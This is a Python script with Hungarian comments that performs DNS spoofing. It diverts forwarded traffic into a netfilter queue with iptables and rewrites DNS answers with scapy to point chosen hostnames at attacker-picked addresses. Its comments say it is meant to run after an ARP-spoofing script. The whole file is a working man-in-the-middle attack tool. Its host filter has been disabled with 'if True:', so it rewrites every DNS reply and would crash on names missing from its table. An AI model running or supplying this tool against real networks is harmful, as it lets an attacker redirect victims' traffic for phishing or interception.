import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

#A DNS szerver alatal kuldott csomagok ip cimet modositjuk 
#Mielott futatujuk ezt a programot, az arp_spoof.py programot is futatjuk
 
class DnsSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()
 
    def __call__(self):
        log.info("Snoofing....")
        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")
 
    def callBack(self, packet):
        #elkpajuk a csomagokat
        scapyPacket = IP(packet.get_payload())
        #csak a DNS csomagokkal foglalkozunk
        if scapyPacket.haslayer(DNSRR):
            try:
                #kiirjuk az eredeti csomagot
                log.info(f'[original] { scapyPacket[DNSRR].summary()}')
                queryName = scapyPacket[DNSQR].qname
                #ha a csomagban olyan nev szerepel amelyet a hostDict-ben meghataroztunk akkor annak az ip cimjet megvaltoztassuk
                if True:#queryName in self.hostDict:
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[DNS].ancount = 1
                    #ezeket azert kell torolni, hogy a scapy biztosan ujraszamolja az ertekuket a modositott adatok fuggvenyeben 
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
                else:
                    log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
        return packet.accept()
 
 
if __name__ == '__main__':
    #a hostDict dictionary-ben meghatarozzuk azokat a host neveket es ip cimeket amelyeket modositani szeretnenk
    try:
        hostDict = {
            b"google.com": "8.8.8.8",
            b"facebook.com.": "8.8.8.8"
        }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s', 
                        level = log.INFO)
        snoof = DnsSnoof(hostDict, queueNum)
        snoof()
    except OSError as error:
        log.error(error)
